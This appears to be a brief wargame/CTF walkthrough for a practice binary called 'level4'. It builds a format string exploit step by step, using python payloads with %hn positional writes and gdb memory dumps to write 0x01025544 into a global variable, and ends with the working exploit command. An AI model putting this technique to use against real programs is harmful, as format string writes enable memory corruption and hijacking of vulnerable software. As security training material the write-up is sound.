same as previous level

python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4


But we can do it another way.

We will use 2 bytes write this time,

take this example

0x00        00           00     		00
0x8049813	0x8049812    0x8049811		0x8049810

basicly we need to replace 0x00000000 with 0x01025544

we will use 0x8049812 and 0x8049810

put a breakpoint on cmp
(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$hn" + "%13$hn"')

(gdb) x/wx 0x8049810
0x8049810 <m>:	0x00080008

So we will wriite 0x0102 and the first one, and 0x5544 and the second one.

since we're writing 8 bytes we need to remove it from our padding

(gdb) print 0x0102 - 0x08
$3 = 250
(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250x" + "%12$hn" + "%13$hn"')
(gdb) x/wx 0x8049810
0x8049810 <m>:	0x01020102

Now the second part
We've already added 0x0102 so we need to remote it for second write.

(gdb) print 0x5544 - 0x0102
$4 = 21570

(gdb) run < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250x" + "%12$hn" + "%21570x" + "%13$hn"')

(gdb) x/wx 0x8049810
0x8049810 <m>:	0x55440102

Oops it's reverse so just use 13 on first and 12 on second

./level4 < <(python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250x"
+ "%13$hn" + "%21570x" + "%12$hn"')

